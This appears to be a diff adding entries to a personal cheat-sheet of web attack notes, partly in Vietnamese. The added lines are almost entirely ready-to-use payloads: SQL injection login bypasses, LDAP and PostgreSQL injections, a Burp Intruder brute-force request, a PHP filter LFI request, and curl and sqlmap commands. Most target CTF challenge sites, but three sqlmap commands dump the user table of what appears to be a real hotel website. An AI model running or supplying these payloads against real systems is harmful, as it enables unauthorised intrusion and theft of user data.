@@ -76,3 +76,77 @@ Manual sql injection commands
 http://<targetip>/shell.php?cmd=id
 
 # Then use Pentest Monkey Reverse Shells to call your shell
+----------------------------------------
+Sql: 
+Fillter dấu trong Sql "=,-,*" 
+admin' or '2' > '1
+
+
+Sql Truncation 
+admin                     sugi
+anything
+
+
+LDAP
+user: admin
+pass: *
+
+Po po po po postgresql 
+'))OR TRUE
+
+Area 51 .htaccess
+
+curl -vv --cookie "PHPSESSID=5u5sonir2saqrdcn92bms31gd0" -X PUT https://ringzer0team.com/challenges/48 --ssl --insecure |grep "FLAG"
+Security through obscurity! 
+
+YWRtaW4sYThmMTBmMWNlNGUxZjQ0YywxNDcxNjk1MTMyLHRydWU6OWVjNjRlYTE5NzlkNTc0ZWVjMDYzZGQzYmFlYmRlNTE=
+
+admin,a8f10f1ce4e1f44c,1471695132,true=MD5
+:9ec64ea1979d574eec063dd3baebde51
+
+-----------------------------------------------------------------------------------------------------------------------------
+sqlmap -u "http://web.challenges.pwnerrank.com/e5f3efcceb11226e71a6bc5317cf0df6/?password=a" -v 3 --dbs -D web5 -T flag --dump
+
+----------------------------------------------------------------------------------------------------------------------------------
+username=a' and 1=2 union select 1,1,1,1,1,1,1,1 -- -# &password=1
+-------------------------------------------------------------------------------------------------------------------------------
+sqlmap -u "https://www.hotelelsalvador.net/en/hotel-offer.php?&id=9" --tables -D information_schema
+sqlmap -u "https://www.hotelelsalvador.net/en/hotel-offer.php?&id=9" --columns -D Sql436940_3 -T user
+sqlmap -u "https://www.hotelelsalvador.net/en/hotel-offer.php?&id=9" --dump -D Sql436940_3 -T user
+Sniper
+GET /e5f3efcceb11226e71a6bc5317cf0df6/?password=admin%27%20having%20(substr(flag,6,1))%20=%20%27§§%27%20%20--%20- HTTP/1.1
+Host: web.challenges.pwnerrank.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: _ga=GA1.2.487678829.1472609687
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+Payload
+Bruteforce
+abcdef0123456789
+Grep-Match: admin
+-----------------------------------------------------------------------------------------------------------------
+
+_ 1 ki tu bat ki
+% tuong ung' nhieu ki tu bat ki
+
+Select * From Book Where bookname Like 'a%'
+
+---------------------------------------------------------------------------------------------------------------------------------
+LFI
+GET /?page=php: HTTP/1.1
+Host: globalpage.chal.ctf.westerns.tokyo
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: /filter/convert.base64-encode/resource=flag
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+--------------------------------------------------------------------------------------------------------------------------------- 
+
+
+
+
